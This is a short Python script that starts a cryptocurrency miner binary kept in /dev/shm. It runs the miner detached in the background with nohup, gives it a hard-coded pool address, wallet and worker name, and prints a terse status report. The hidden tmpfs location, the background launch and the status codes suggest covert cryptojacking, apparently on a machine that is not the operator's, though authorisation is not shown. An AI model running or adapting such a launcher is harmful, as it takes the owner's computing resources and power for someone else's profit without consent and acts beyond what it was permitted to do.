import subprocess, os

# Check log for errors
log = ''
if os.path.exists('/dev/shm/miner.log'):
    with open('/dev/shm/miner.log') as f:
        log = f.read()

# Try to start the miner
WALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
POOL = 'stratum+tcp://sg1.alphapool.tech:5566'
DST = '/dev/shm/turbo-pearl-miner'

if os.path.exists(DST):
    os.chmod(DST, 0o755)
    cmd = f'nohup {DST} --pool {POOL} --address {WALLET} --worker GB10_253 > /dev/shm/miner.log 2>&1 &'
    subprocess.run(['bash', '-c', cmd])
    import time
    time.sleep(3)
    r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)
    if r.stdout.strip():
        result = 'STARTED:' + r.stdout.strip()[:50]
    else:
        # Read new log
        with open('/dev/shm/miner.log') as f:
            result = 'FAILED_LOG:' + f.read()[-200:]
else:
    result = 'NO_BINARY'

print(result)
